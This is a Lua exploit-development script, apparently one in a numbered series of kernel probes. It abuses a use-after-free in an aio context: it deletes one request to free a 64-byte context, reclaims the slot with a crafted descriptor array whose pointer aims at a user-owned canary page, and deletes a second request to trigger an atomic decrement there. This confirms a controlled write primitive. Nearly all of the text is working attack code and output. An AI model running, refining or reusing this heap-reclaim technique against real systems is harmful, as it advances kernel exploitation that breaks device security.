-- CRASH_CLASS: RISKY
-- PROBE 504c: point the stale context's [C+0x10] at a user page and let item 1's
-- delete execute the refcount release on it.
--
-- Item 0's delete writes [C+0x10]=0 and frees C, so a plain rerun proves nothing
-- (504b). This run refills the 64-byte slot with an aio descriptor array D
-- (malloc(count*0x28) is the first 64-byte allocation of create) whose qword at
-- +0x10 is a mapped user page holding 0x41414141. If D lands on the freed slot,
-- item 1's delete runs 0x8ac69670(P) = "lock xadd dword [P], -1" and the canary
-- reads back 0x41414140. If it does not land, the canary is untouched and the
-- run is clean.

print("=== PROBE 504c: aio stale-context decrement probe ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fill(page, val, n)
    for o = 0, (n or 0x1000) - 4, 4 do wr(page + o, val) end
end
local function hi(v)
    if type(v) == "table" and v.h then return to_num(v.h) end
    return 0
end
local function lo(v) return to_num(v) end
local function u64(addr)
    return uint64(string.format("0x%X%08X", hi(addr), lo(addr)))
end

local DATA = memory.alloc(0x1000)
local DESC = memory.alloc(0x1000)
local OUT  = memory.alloc(0x1000)
local IDS  = memory.alloc(0x1000)
local RES  = memory.alloc(0x1000)
local CAN  = memory.alloc(0x1000)
fill(DATA, 0)
fill(DESC, 0x42424242)
wr(CAN, 0x41414141)                 -- canary the release would decrement
wr(CAN + 4, 0xDEADBEEF)
local can_addr = to_num(CAN)
print(string.format("canary page = 0x%X (holds 0x41414141)", can_addr))
wq(DESC + 0x10, u64(CAN))

local N = 4
local function one_id(base, i) return base + i * 0x10000 end

wr(OUT, 0)
local okc, retc = pcall(function() return sc_c(0x1001, DATA, N, 1, OUT) end)
local base = rd(OUT)
print(string.format("A create count=%d ok=%s ret=%d base=%d", N, tostring(okc), to_num(retc), base))
if base == 0 then print("=== DONE ===") return end
for i = 0, N - 1 do
    wr(IDS, one_id(base, i)); fill(RES, 0x77777777, 4)
    pcall(function() return sc_p(IDS, 1, RES) end)
end

wr(IDS, one_id(base, 0)); fill(RES, 0x77777777, 4)
local ok0, r0 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("B delete item0 ok=%s ret=%d st=%08x (context freed)", tostring(ok0), to_num(r0), rd(RES)))

for k = 1, 3 do
    wr(OUT, 0)
    local ok, r = pcall(function() return sc_c(1, DESC, 1, 1, OUT) end)
    print(string.format("C%d filler create ok=%s ret=%d id=%d", k, tostring(ok), to_num(r), rd(OUT)))
end
print(string.format("   canary before = %08x %08x", rd(CAN), rd(CAN + 4)))

wr(IDS, one_id(base, 1)); fill(RES, 0x77777777, 4)
local ok1, r1 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("D delete item1 ok=%s ret=%d st=%08x", tostring(ok1), to_num(r1), rd(RES)))
print(string.format("   canary after  = %08x %08x", rd(CAN), rd(CAN + 4)))
if rd(CAN) ~= 0x41414141 then
    print("*** CANARY CHANGED: the stale context pointed at our page ***")
else
    print("canary untouched (descriptor did not land on the freed slot)")
end
print("=== DONE ===")
